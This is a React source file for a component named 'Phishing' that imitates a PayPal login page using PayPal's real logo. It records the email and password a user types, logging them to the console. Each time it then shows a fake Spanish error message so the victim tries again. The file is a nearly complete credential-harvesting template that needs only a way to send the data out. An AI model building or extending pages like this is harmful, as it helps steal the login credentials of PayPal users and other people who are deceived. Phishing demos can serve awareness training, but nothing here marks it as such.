import { useState } from "react";

export default function Phishing() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const handleAccept = () => {
    console.log(email)
    console.log(password)
    setError('')
    setError('Parte de su información no es correcta. Inténtelo de nuevo.')
  }

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  return (
    <section className="h-screen">
      <div className="flex justify-center h-full md:items-center items-start">
        <div className="p-10 rounded md:border border-gray-200" style={{ width: "410px" }}>
          <div className="text-center mb-3">
            <img
              src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-150px.png"
              alt="PayPal Logo"
              width={95}
              height={26}
            />
          </div>

          <div>
            {error && <text className="text-red-500 font-bold">{error}</text>}
            <input
              onChange={handleEmailChange}
              value={email}
              type="text"
              className="tracking-tight px-2 mt-1 block rounded border border-input font-normal text-black text-sm w-full"
              placeholder="Email or mobile number"
              style={{ height: "43px" }}
            />

            <input
              type="password"
              value={password}
              className="tracking-tight px-2 mt-5 block rounded border border-input font-normal text-black text-sm w-full"
              placeholder="Enter your password"
              style={{ height: "43px" }}
              onChange={handlePasswordChange}
            />
          </div>

          <p className="text-secondary text-sm my-3 tracking-tight font-medium">
            Forgot password?
          </p>
          <button
            className="rounded bg-blue-500 text-primary font-semibold text-sm hover:bg-graytwo text-white w-full"
            style={{ height: "42px" }}
            onClick={handleAccept}
          >
            Log In
          </button>

          <h2
            className="w-full text-center"
            style={{
              borderBottom: "1px solid #cbd2d6",
              lineHeight: "0.1em",
              margin: "20px 0px 20px",
            }}
          >
            <span className="bg-white px-2 text-gray text-xs">or</span>
          </h2>

          <button
            className="rounded bg-white text-primary font-semibold text-sm hover:bg-graytwo text-black w-full border border-gray-300"
            style={{ height: "42px" }}
            onClick={handleAccept}
          >
            Sign Up
          </button>
        </div>

        <div
          className="bg-secondary absolute bottom-0 w-full h-9 flex flex-cols items-center justify-center"
          style={{ color: "#666666", fontSize: "10px" }}
        >
          <a className="cursor-pointer mx-2">Contact us</a>
          <a className="cursor-pointer mx-2">Privacy</a>
          <a className="cursor-pointer mx-2">Legal</a>
          <a className="cursor-pointer mx-2">Worldwide</a>
        </div>
      </div>
    </section>
  );
}
